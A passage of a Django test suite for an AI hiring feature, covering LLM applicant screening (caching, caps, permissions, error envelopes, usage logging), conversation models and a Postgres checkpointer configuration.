        self.assertIn("Not provided", text)

    def test_fetch_is_newest_first_and_capped(self):
        from django.utils import timezone
        from datetime import timedelta
        from apps.ai.services import MAX_SCREENED_APPLICANTS, _fetch_applications
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        base = timezone.now()
        for i in range(MAX_SCREENED_APPLICANTS + 3):
            self.make_applicant(job_post, f"bulk{i}@example.com",
                                application_date=base + timedelta(minutes=i))
        applications = _fetch_applications(job_post)
        self.assertEqual(len(applications), MAX_SCREENED_APPLICANTS)
        dates = [a.application_date for a in applications]
        self.assertEqual(dates, sorted(dates, reverse=True))

    def test_dossier_caps_rows_per_section(self):
        # Seekers create education/experience/skill rows through unrestricted
        # viewsets, so an applicant could otherwise pad one dossier to megabytes
        # of prompt text billed to the company.
        from apps.seekers.models import EducationData, ExperienceData, SeekerSkillSet, SkillSet
        from apps.ai.services import (
            MAX_DOSSIER_EDUCATION, MAX_DOSSIER_EXPERIENCE, MAX_DOSSIER_SKILLS,
            _build_dossier, _fetch_applications,
        )
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        user = self.make_applicant(job_post, "flood@example.com").user_account
        for i in range(MAX_DOSSIER_EXPERIENCE + 5):
            ExperienceData.objects.create(
                user_account=user, company_name=f"Padding Corp {i}",
                position="Engineer", description="padding",
                start_date="2021-01-01", end_date="2022-01-01")
        for i in range(MAX_DOSSIER_EDUCATION + 5):
            EducationData.objects.create(
                user_account=user, institute_university_name=f"Padding U {i}",
                degree_type="Bachelor", field_of_study="Computer Science",
                start_date="2016-01-01", end_date="2020-01-01")
        for i in range(MAX_DOSSIER_SKILLS + 5):
            skill, _ = SkillSet.objects.get_or_create(skill_name=f"Padding skill {i}")
            SeekerSkillSet.objects.create(
                user_account=user, skill_set=skill, skill_level="Beginner")

        text = _build_dossier("candidate_1", _fetch_applications(job_post)[0])

        self.assertEqual(text.count("Experience: "), MAX_DOSSIER_EXPERIENCE)
        self.assertEqual(text.count("Education: "), MAX_DOSSIER_EDUCATION)
        skills_line = next(
            line for line in text.splitlines() if line.startswith("Skills: "))
        rendered_skills = skills_line[len("Skills: "):].split(", ")
        self.assertEqual(len(rendered_skills), MAX_DOSSIER_SKILLS)

    def test_dossier_assembly_query_count_is_flat(self):
        from django.test.utils import CaptureQueriesContext
        from django.db import connection
        from apps.ai.services import _build_dossier, _fetch_applications

        def assemble(job_post):
            with CaptureQueriesContext(connection) as ctx:
                applications = _fetch_applications(job_post)
                for i, activity in enumerate(applications, start=1):
                    _build_dossier(f"candidate_{i}", activity)
            return len(ctx)

        owner = self.make_company_user()
        small = self.make_job_post(owner, title="Small")
        for i in range(3):
            self.make_applicant(small, f"small{i}@example.com")
        large = self.make_job_post(owner, title="Large")
        for i in range(12):
            self.make_applicant(large, f"large{i}@example.com")

        small_queries = assemble(small)
        large_queries = assemble(large)
        self.assertLessEqual(small_queries, 10)
        self.assertLessEqual(large_queries, 10)
        # The real N+1 guard: cost must not grow with the number of applicants.
        self.assertEqual(small_queries, large_queries)


class _ApplyDuringCallModel(FakeStructuredChatModel):
    """Fake model that runs `on_invoke` while the 'LLM call' is in flight.

    Reproduces an application landing between the applicant fetch and the
    ScreeningReport row being written.
    """

    on_invoke: Any = None

    def with_structured_output(self, schema, method="json_schema", *,
                               include_raw=False, **kwargs):
        inner = super().with_structured_output(
            schema, method=method, include_raw=include_raw, **kwargs)

        def _call(payload):
            self.on_invoke()
            return inner.invoke(payload)

        return RunnableLambda(_call)


class ScreenApplicantsServiceTests(_ScreeningFixture, TestCase):
    def _result(self, refs_and_scores):
        from apps.ai.schemas import CandidateAssessment, ScreeningResult
        return ScreeningResult(candidates=[
            CandidateAssessment(candidate_ref=ref, score=score,
                                strengths=["s"], gaps=["g"], summary="sum")
            for ref, score in refs_and_scores
        ])

    def _fake(self, *results):
        from apps.ai.testing import FakeStructuredChatModel
        return FakeStructuredChatModel(parsed_outputs=list(results))

    def test_returns_ranked_candidates_and_persists_a_report(self):
        from apps.ai.models import ScreeningReport
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "low@example.com", first="Low", last="Score")
        self.make_applicant(job_post, "high@example.com", first="High", last="Score")

        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([("candidate_1", 40), ("candidate_2", 95)])))

        self.assertEqual(out['applicant_count'], 2)
        self.assertFalse(out['cached'])
        self.assertFalse(out['truncated'])
        self.assertEqual([c['rank'] for c in out['candidates']], [1, 2])
        self.assertEqual(out['candidates'][0]['score'], 95)
        self.assertEqual(ScreeningReport.objects.filter(job_post=job_post).count(), 1)

    def test_candidate_carries_real_application_and_applicant_ids(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        activity = self.make_applicant(job_post, "one@example.com",
                                       first="Solo", last="Applicant")
        out = screen_applicants(owner, job_post_id=job_post.id,
                                model=self._fake(self._result([("candidate_1", 70)])))
        candidate = out['candidates'][0]
        self.assertEqual(candidate['application_id'], str(activity.id))
        self.assertEqual(candidate['applicant_id'], str(activity.user_account_id))
        self.assertEqual(candidate['applicant_name'], "Solo Applicant")

    def test_invented_and_duplicate_labels_are_dropped(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "real@example.com")
        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([
                ("candidate_1", 80), ("candidate_1", 60), ("candidate_99", 99)])))
        self.assertEqual(len(out['candidates']), 1)
        self.assertEqual(out['candidates'][0]['score'], 80)

    def test_scores_are_clamped_to_0_100(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "clamphigh@example.com", first="High", last="One")
        self.make_applicant(job_post, "clamplow@example.com", first="Low", last="Two")
        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([("candidate_1", 250), ("candidate_2", -5)])))
        self.assertEqual(sorted(c['score'] for c in out['candidates']), [0, 100])

    def test_second_call_returns_the_cached_report_without_an_llm_call(self):
        from apps.ai.models import ScreeningReport
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "cache@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 77)])))

        # A fake with no scripted outputs raises inside _invoke_structured, which the
        # retry wrapper converts to AIProviderError — so this call blows up loudly if
        # the cache path is skipped.
        out = screen_applicants(owner, job_post_id=job_post.id, model=self._fake())

        self.assertTrue(out['cached'])
        self.assertEqual(out['candidates'][0]['score'], 77)
        self.assertEqual(ScreeningReport.objects.filter(job_post=job_post).count(), 1)

    def test_refresh_forces_a_new_run(self):
        from apps.ai.models import ScreeningReport
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "refresh@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 10)])))
        out = screen_applicants(owner, job_post_id=job_post.id, refresh=True,
                                model=self._fake(self._result([("candidate_1", 90)])))
        self.assertFalse(out['cached'])
        self.assertEqual(out['candidates'][0]['score'], 90)
        self.assertEqual(ScreeningReport.objects.filter(job_post=job_post).count(), 2)

    def test_a_newer_application_makes_the_report_stale(self):
        from datetime import timedelta
        from django.utils import timezone
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "first@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 55)])))

        self.make_applicant(job_post, "second@example.com",
                            application_date=timezone.now() + timedelta(hours=1))
        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([("candidate_1", 60), ("candidate_2", 65)])))
        self.assertFalse(out['cached'])
        self.assertEqual(out['applicant_count'], 2)

    def test_withdraw_then_reapply_still_invalidates(self):
        # The staleness rule is a timestamp comparison, not a count comparison:
        # a count check would see 1 both before and after and wrongly serve cache.
        from datetime import timedelta
        from django.utils import timezone
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        first = self.make_applicant(job_post, "churn1@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 30)])))
        first.delete()
        self.make_applicant(job_post, "churn2@example.com",
                            application_date=timezone.now() + timedelta(hours=1))
        out = screen_applicants(owner, job_post_id=job_post.id,
                                model=self._fake(self._result([("candidate_1", 88)])))
        self.assertFalse(out['cached'])
        self.assertEqual(out['candidates'][0]['score'], 88)

    def test_application_arriving_during_the_llm_call_is_not_lost(self):
        # The report is stamped with the run's start, not its write time, so an
        # application that lands mid-call is still "newer" than the report and
        # invalidates it. Otherwise it is absent from the report AND judged not
        # newer forever, until some unrelated application happens to arrive.
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "early@example.com")

        model = _ApplyDuringCallModel(
            parsed_outputs=[self._result([("candidate_1", 50)])],
            on_invoke=lambda: self.make_applicant(job_post, "midflight@example.com"))
        first = screen_applicants(owner, job_post_id=job_post.id, model=model)
        self.assertEqual(first['applicant_count'], 1)

        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([("candidate_1", 60), ("candidate_2", 70)])))
        self.assertFalse(out['cached'])
        self.assertEqual(out['applicant_count'], 2)

    def test_excluded_count_never_goes_negative(self):
        # The pool is COUNTed, then fetched; an application inserted between the
        # two makes len(applications) > total_applicants.
        from apps.ai import services
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "race1@example.com")
        real_fetch = services._fetch_applications

        def racing_fetch(post):
            self.make_applicant(post, "race2@example.com")
            return real_fetch(post)

        with patch.object(services, "_fetch_applications", racing_fetch):
            out = services.screen_applicants(
                owner, job_post_id=job_post.id,
                model=self._fake(self._result([("candidate_1", 50),
                                               ("candidate_2", 60)])))
        self.assertEqual(out['excluded_count'], 0)

    def test_cap_sets_truncated_and_excluded_count(self):
        from datetime import timedelta
        from django.utils import timezone
        from apps.ai.services import MAX_SCREENED_APPLICANTS, screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        base = timezone.now()
        for i in range(MAX_SCREENED_APPLICANTS + 3):
            self.make_applicant(job_post, f"cap{i}@example.com",
                                application_date=base + timedelta(minutes=i))
        out = screen_applicants(
            owner, job_post_id=job_post.id,
            model=self._fake(self._result([("candidate_1", 50)])))
        self.assertTrue(out['truncated'])
        self.assertEqual(out['excluded_count'], 3)
        self.assertEqual(out['applicant_count'], MAX_SCREENED_APPLICANTS)

    def test_no_applicants_raises(self):
        from apps.ai.exceptions import NoApplicantsError
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        with self.assertRaises(NoApplicantsError):
            screen_applicants(owner, job_post_id=job_post.id, model=self._fake())

    def test_emptied_applicant_pool_stops_serving_the_cached_report(self):
        from apps.ai.exceptions import NoApplicantsError
        from apps.ai.services import screen_applicants
        from apps.jobs.models import JobPostActivity
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "gone@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 50)])))
        JobPostActivity.objects.filter(job_post=job_post).delete()
        with self.assertRaises(NoApplicantsError):
            screen_applicants(owner, job_post_id=job_post.id, model=self._fake())

    def test_missing_job_post_raises(self):
        import uuid as uuid_module
        from apps.ai.exceptions import JobPostNotFoundError
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        with self.assertRaises(JobPostNotFoundError):
            screen_applicants(owner, job_post_id=uuid_module.uuid4(), model=self._fake())

    def test_other_company_is_denied(self):
        from apps.ai.exceptions import ScreeningPermissionError
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        intruder = self.make_company_user(email="intruder@example.com",
                                          company_name="Other")
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "app@example.com")
        with self.assertRaises(ScreeningPermissionError):
            screen_applicants(intruder, job_post_id=job_post.id, model=self._fake())

    def test_admin_may_screen_another_companys_post(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        admin = UserAccount.objects.create_user(
            email="admin@example.com", password="Str0ng-Password!", user_type="company")
        admin.is_staff = True
        admin.save()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "seen@example.com")
        out = screen_applicants(admin, job_post_id=job_post.id,
                                model=self._fake(self._result([("candidate_1", 65)])))
        self.assertEqual(out['candidates'][0]['score'], 65)

    def test_superuser_may_screen_another_companys_post(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        root = UserAccount.objects.create_user(
            email="root2@example.com", password="Str0ng-Password!", user_type="job_seeker")
        root.is_superuser = True
        root.save()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "seen2@example.com")
        out = screen_applicants(root, job_post_id=job_post.id,
                                model=self._fake(self._result([("candidate_1", 44)])))
        self.assertEqual(out['candidates'][0]['score'], 44)

    def test_usage_row_written_for_the_llm_call(self):
        from apps.ai.models import AIUsageLog
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "usage@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 50)])))
        rows = AIUsageLog.objects.filter(feature=AIUsageLog.Feature.SCREENING)
        self.assertEqual(rows.count(), 1)
        self.assertEqual(rows.first().input_tokens, 100)

    def test_cached_path_writes_no_usage_row(self):
        from apps.ai.models import AIUsageLog
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "nousage@example.com")
        screen_applicants(owner, job_post_id=job_post.id,
                          model=self._fake(self._result([("candidate_1", 50)])))
        screen_applicants(owner, job_post_id=job_post.id, model=self._fake())
        self.assertEqual(
            AIUsageLog.objects.filter(feature=AIUsageLog.Feature.SCREENING).count(), 1)

    def test_provider_error_propagates_and_writes_no_report(self):
        from apps.ai.exceptions import AIProviderError
        from apps.ai.models import ScreeningReport
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "boom@example.com")
        model = self._fake(RuntimeError("provider down"), RuntimeError("provider down"))
        with self.assertRaises(AIProviderError):
            screen_applicants(owner, job_post_id=job_post.id, model=model)
        self.assertEqual(ScreeningReport.objects.count(), 0)

    def test_logs_no_dossier_text_and_mutates_no_application(self):
        from apps.ai.services import screen_applicants
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        activity = self.make_applicant(
            job_post, "quiet@example.com", first="Ada", last="Lovelace",
            cover_letter="SECRETCOVERLETTER")
        with self.assertLogs('apps.ai', level='INFO') as captured:
            screen_applicants(owner, job_post_id=job_post.id,
                              model=self._fake(self._result([("candidate_1", 50)])))
        joined = "\n".join(captured.output)
        self.assertNotIn("SECRETCOVERLETTER", joined)
        self.assertNotIn("quiet@example.com", joined)
        self.assertNotIn("Prior Corp", joined)
        activity.refresh_from_db()
        self.assertEqual(activity.application_status, 'pending')


class ScreenApplicantsEndpointTests(_ScreeningFixture, APITestCase):
    def _url(self, job_post, query=""):
        return f"/api/v1/ai/job-posts/{job_post.id}/screen/{query}"

    def _result(self, refs_and_scores):
        from apps.ai.schemas import CandidateAssessment, ScreeningResult
        return ScreeningResult(candidates=[
            CandidateAssessment(candidate_ref=ref, score=score,
                                strengths=["s"], gaps=["g"], summary="sum")
            for ref, score in refs_and_scores
        ])

    def _patch_model(self, *results):
        from apps.ai.testing import FakeStructuredChatModel
        return patch("apps.ai.services.get_model",
                     return_value=FakeStructuredChatModel(parsed_outputs=list(results)))

    def test_owner_gets_ranked_candidates(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e1@example.com")
        _auth(self.client, owner)
        with self._patch_model(self._result([("candidate_1", 82)])):
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data['applicant_count'], 1)
        self.assertEqual(response.data['candidates'][0]['rank'], 1)
        self.assertFalse(response.data['cached'])

    def test_second_request_is_served_from_cache(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e2@example.com")
        _auth(self.client, owner)
        with self._patch_model(self._result([("candidate_1", 82)])):
            self.client.post(self._url(job_post))
        # A fake with no scripted outputs raises inside _invoke_structured, which the
        # retry wrapper converts to AIProviderError — so this call comes back 502, not
        # 200, if the cache path is skipped.
        with self._patch_model():
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.data['cached'])

    def test_refresh_query_param_forces_a_new_run(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e3@example.com")
        _auth(self.client, owner)
        with self._patch_model(self._result([("candidate_1", 20)])):
            self.client.post(self._url(job_post))
        with self._patch_model(self._result([("candidate_1", 99)])):
            response = self.client.post(self._url(job_post, "?refresh=true"))
        self.assertFalse(response.data['cached'])
        self.assertEqual(response.data['candidates'][0]['score'], 99)

    def test_no_applicants_returns_409(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        _auth(self.client, owner)
        # A fake with no scripted outputs raises inside _invoke_structured, which the
        # retry wrapper converts to AIProviderError — so this call comes back 502, not
        # 409, if the empty-pool check is skipped.
        with self._patch_model():
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 409)
        self.assertIn('error', response.data)

    def test_unknown_job_post_returns_404(self):
        import uuid as uuid_module
        owner = self.make_company_user()
        _auth(self.client, owner)
        response = self.client.post(
            f"/api/v1/ai/job-posts/{uuid_module.uuid4()}/screen/")
        self.assertEqual(response.status_code, 404)
        self.assertEqual(response.data['error'], 'Job post not found')

    def test_other_company_returns_403(self):
        owner = self.make_company_user()
        intruder = self.make_company_user(email="nope@example.com", company_name="Other")
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e4@example.com")
        _auth(self.client, intruder)
        response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 403)

    def test_seeker_returns_403(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        seeker = UserAccount.objects.create_user(
            email="seek@example.com", password="Str0ng-Password!", user_type="job_seeker")
        _auth(self.client, seeker)
        response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 403)

    def test_anonymous_returns_401(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 401)

    def test_admin_may_screen_another_companys_post(self):
        owner = self.make_company_user()
        admin = UserAccount.objects.create_user(
            email="root@example.com", password="Str0ng-Password!", user_type="company")
        admin.is_staff = True
        admin.save()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e5@example.com")
        _auth(self.client, admin)
        with self._patch_model(self._result([("candidate_1", 71)])):
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 200)

    def test_provider_failure_returns_502(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e6@example.com")
        _auth(self.client, owner)
        with self._patch_model(RuntimeError("down"), RuntimeError("down")):
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 502)

    def test_quota_failure_returns_429(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "e7@example.com")
        _auth(self.client, owner)
        with self._patch_model(RuntimeError("RESOURCE_EXHAUSTED")):
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 429)
        self.assertIn('quota', response.data['error'].lower())

    def test_unparseable_output_returns_502_and_bills_both_attempts(self):
        from apps.ai.models import AIUsageLog
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "parse@example.com")
        _auth(self.client, owner)
        with self._patch_model(None, None):
            response = self.client.post(self._url(job_post))
        self.assertEqual(response.status_code, 502)
        self.assertEqual(
            AIUsageLog.objects.filter(feature=AIUsageLog.Feature.SCREENING).count(), 2)

    def test_get_is_not_allowed(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        _auth(self.client, owner)
        self.assertEqual(self.client.get(self._url(job_post)).status_code, 405)

    def test_screening_uses_the_pro_tier(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "tier@example.com")
        _auth(self.client, owner)
        with self._patch_model(self._result([("candidate_1", 60)])) as mocked_get_model:
            self.client.post(self._url(job_post))
        mocked_get_model.assert_called_once_with('pro')

    def test_throttle_classes_are_the_four_layer_stack(self):
        from rest_framework.throttling import AnonRateThrottle, UserRateThrottle
        from apps.ai import views
        from apps.ai.throttling import AIRateThrottle
        from jobApp.throttling import BurstRateThrottle
        self.assertEqual(
            views.screen_applicants.cls.throttle_classes,
            [AnonRateThrottle, UserRateThrottle, BurstRateThrottle, AIRateThrottle])


def _schema_error_shapes(schema, path, status):
    """Property-name sets a client may receive for one path/status.

    Returns a sorted list of sorted property lists — one entry per branch of a
    oneOf, so [['detail'], ['error']] means either envelope is possible.
    """
    components = schema['components']['schemas']

    def resolve(node):
        if '$ref' in node:
            return resolve(components[node['$ref'].rsplit('/', 1)[-1]])
        if 'oneOf' in node:
            branches = []
            for branch in node['oneOf']:
                branches.extend(resolve(branch))
            return branches
        return [sorted(node.get('properties', {}))]

    response = schema['paths'][path]['post']['responses'][str(status)]
    return sorted(resolve(response['content']['application/json']['schema']))


class AIErrorSchemaHonestyTests(_ScreeningFixture, APITestCase):
    """The declared error envelope must match what clients actually receive.

    DRF answers permission and throttle failures itself, before the view body
    runs, with {'detail': ...}; the views' own translations use {'error': ...}.
    Declaring one shape for both would hand generated clients a field that is
    never populated.
    """

    maxDiff = None
    ASSIST = '/api/v1/ai/job-post-assist/'
    RESUME = '/api/v1/ai/resume-import/'
    SCREEN = '/api/v1/ai/job-posts/{job_post_id}/screen/'

    def _schema(self):
        from drf_spectacular.generators import SchemaGenerator
        return SchemaGenerator().get_schema(request=None, public=True)

    # --- what the schema promises -------------------------------------------------

    def test_401_is_declared_as_detail_on_every_ai_endpoint(self):
        schema = self._schema()
        for path in (self.ASSIST, self.RESUME, self.SCREEN):
            with self.subTest(path=path):
                self.assertEqual(
                    _schema_error_shapes(schema, path, 401), [['detail']])

    def test_403_is_declared_as_detail_where_only_the_permission_class_can_fail(self):
        schema = self._schema()
        for path in (self.ASSIST, self.RESUME):
            with self.subTest(path=path):
                self.assertEqual(
                    _schema_error_shapes(schema, path, 403), [['detail']])

    def test_screening_403_is_declared_as_either_envelope(self):
        # Non-company user -> permission class -> {'detail'};
        # company that does not own the post -> ScreeningPermissionError -> {'error'}.
        self.assertEqual(
            _schema_error_shapes(self._schema(), self.SCREEN, 403),
            [['detail'], ['error']])

    def test_429_is_declared_as_either_envelope_on_every_ai_endpoint(self):
        # Local throttle -> {'detail'}; provider quota -> {'error'}.
        schema = self._schema()
        for path in (self.ASSIST, self.RESUME, self.SCREEN):
            with self.subTest(path=path):
                self.assertEqual(
                    _schema_error_shapes(schema, path, 429),
                    [['detail'], ['error']])

    def test_view_translated_statuses_stay_declared_as_error(self):
        schema = self._schema()
        self.assertEqual(_schema_error_shapes(schema, self.ASSIST, 400), [['error']])
        self.assertEqual(_schema_error_shapes(schema, self.SCREEN, 404), [['error']])
        self.assertEqual(_schema_error_shapes(schema, self.SCREEN, 409), [['error']])
        self.assertEqual(_schema_error_shapes(schema, self.SCREEN, 502), [['error']])

    # --- what clients actually receive --------------------------------------------

    def test_anonymous_401_body_uses_detail(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        response = self.client.post(f"/api/v1/ai/job-posts/{job_post.id}/screen/")
        self.assertEqual(response.status_code, 401)
        self.assertIn('detail', response.data)
        self.assertNotIn('error', response.data)

    def test_wrong_user_type_403_body_uses_detail(self):
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        seeker = UserAccount.objects.create_user(
            email="shape-seeker@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        _auth(self.client, seeker)
        response = self.client.post(f"/api/v1/ai/job-posts/{job_post.id}/screen/")
        self.assertEqual(response.status_code, 403)
        self.assertIn('detail', response.data)
        self.assertNotIn('error', response.data)

    def test_non_owner_company_403_body_uses_error(self):
        owner = self.make_company_user()
        intruder = self.make_company_user(
            email="shape-intruder@example.com", company_name="Other")
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "shape-app@example.com")
        _auth(self.client, intruder)
        response = self.client.post(f"/api/v1/ai/job-posts/{job_post.id}/screen/")
        self.assertEqual(response.status_code, 403)
        self.assertIn('error', response.data)
        self.assertNotIn('detail', response.data)


class ConversationModelTests(TestCase):
    def _seeker(self, email="conv@example.com"):
        return UserAccount.objects.create_user(
            email=email, password="Str0ng-Password!", user_type="job_seeker")

    def test_creates_row_with_uuid_pk_and_title(self):
        from apps.ai.models import Conversation
        row = Conversation.objects.create(user=self._seeker(), title="Find me python jobs")
        self.assertIsNotNone(row.id)
        self.assertEqual(row.title, "Find me python jobs")
        self.assertIsNotNone(row.created_at)

    def test_title_max_length_is_60(self):
        from apps.ai.models import Conversation
        self.assertEqual(Conversation._meta.get_field("title").max_length, 60)

    def test_ordering_is_newest_first(self):
        from apps.ai.models import Conversation
        user = self._seeker()
        old = Conversation.objects.create(
            user=user, title="old", created_at=timezone.now() - timedelta(hours=1))
        new = Conversation.objects.create(user=user, title="new")
        self.assertEqual([c.id for c in Conversation.objects.all()], [new.id, old.id])

    def test_deleting_user_deletes_conversations(self):
        """Personal content, not a billing record: CASCADE, not SET_NULL.

        The pre_delete receiver runs on this cascade too, and with no
        _checkpointer attached (cascades have no such hint) it falls back to
        the real get_checkpointer() — patched here purely so that fallback
        doesn't reach a live Postgres pool. The subject under test stays the
        CASCADE behaviour, asserted below exactly as before.
        """
        from unittest.mock import MagicMock
        from apps.ai.models import Conversation
        user = self._seeker()
        Conversation.objects.create(user=user, title="mine")
        with patch("apps.ai.signals.get_checkpointer", return_value=MagicMock()):
            user.delete()
        self.assertEqual(Conversation.objects.count(), 0)

    def test_related_name_is_ai_conversations(self):
        from apps.ai.models import Conversation
        user = self._seeker()
        Conversation.objects.create(user=user, title="mine")
        self.assertEqual(user.ai_conversations.count(), 1)


class ChatExceptionTests(TestCase):
    def test_conversation_not_found_error_exists(self):
        from apps.ai.exceptions import ConversationNotFoundError
        self.assertTrue(issubclass(ConversationNotFoundError, Exception))

    def test_agent_limit_exceeded_error_exists(self):
        from apps.ai.exceptions import AgentLimitExceededError
        self.assertTrue(issubclass(AgentLimitExceededError, Exception))

    def test_conversation_exhausted_error_exists(self):
        from apps.ai.exceptions import ConversationExhaustedError
        self.assertTrue(issubclass(ConversationExhaustedError, Exception))


class CheckpointerTests(TestCase):
    def tearDown(self):
        from apps.ai.checkpointer import reset_checkpointer
        reset_checkpointer()

    def test_conn_string_built_from_config(self):
        import config
        from apps.ai.checkpointer import build_conn_string
        conn = build_conn_string()
        self.assertTrue(conn.startswith("postgresql://"))
        self.assertIn(config.DB_NAME, conn)
        self.assertIn(config.DB_HOST, conn)
        self.assertIn(str(config.DB_PORT), conn)

    def test_conn_string_percent_encodes_password(self):
        """A password with @ or / must not be parsed as URI structure."""
        from apps.ai.checkpointer import build_conn_string
        with patch("apps.ai.checkpointer.DB_PASSWORD", "p@ss/w:rd"):
            conn = build_conn_string()
        self.assertNotIn("p@ss/w:rd", conn)
        self.assertIn("p%40ss%2Fw%3Ard", conn)

    def test_conn_string_encodes_space_as_percent20_not_plus(self):
        """quote_plus would emit '+', which is a literal '+' in URI userinfo —
        authentication would fail with a baffling error at the first chat turn."""
        from apps.ai.checkpointer import build_conn_string
        with patch("apps.ai.checkpointer.DB_PASSWORD", "pass word"):
            conn = build_conn_string()
        self.assertIn("pass%20word", conn)
        self.assertNotIn("pass+word", conn)

    # These three tests deliberately exercise get_checkpointer()'s real body —
    # singleton construction, PostgresSaver/serde wiring, pool kwargs — with
    # only ConnectionPool itself mocked out, so no socket ever opens. That
    # means they must opt back out of AI_BLOCK_REAL_CHECKPOINTER (test.py
    # default: True), which exists precisely to stop everyone ELSE from
    # reaching this code path unpatched.
    @override_settings(AI_BLOCK_REAL_CHECKPOINTER=False)
    def test_saver_is_built_with_a_strict_msgpack_serializer(self):
        """The env var is a no-op (langgraph snapshots it at import, long before
        this module loads), so strictness must be passed explicitly. The default
        JsonPlusSerializer() is fully permissive: _allowed_msgpack_modules is True."""
        from apps.ai import checkpointer as cp
        with patch.object(cp, "ConnectionPool"):
            saver = cp.get_checkpointer()
        self.assertIsNone(saver.serde._allowed_msgpack_modules)

    def test_settings_set_the_strict_flag_early_as_defence_in_depth(self):
        import os
        self.assertEqual(os.environ.get("LANGGRAPH_STRICT_MSGPACK"), "true")

    @override_settings(AI_BLOCK_REAL_CHECKPOINTER=False)
    def test_get_checkpointer_is_a_singleton(self):
        from apps.ai import checkpointer as cp
        with patch.object(cp, "ConnectionPool") as pool:
            first = cp.get_checkpointer()
            second = cp.get_checkpointer()
        self.assertIs(first, second)
        self.assertEqual(pool.call_count, 1)

    @override_settings(AI_BLOCK_REAL_CHECKPOINTER=False)
    def test_pool_configured_autocommit_dict_row_and_open(self):
        from apps.ai import checkpointer as cp
        with patch.object(cp, "ConnectionPool") as pool:
            cp.get_checkpointer()
        kwargs = pool.call_args.kwargs
        self.assertTrue(kwargs["kwargs"]["autocommit"])
        self.assertIs(kwargs["kwargs"]["row_factory"], cp.dict_row)
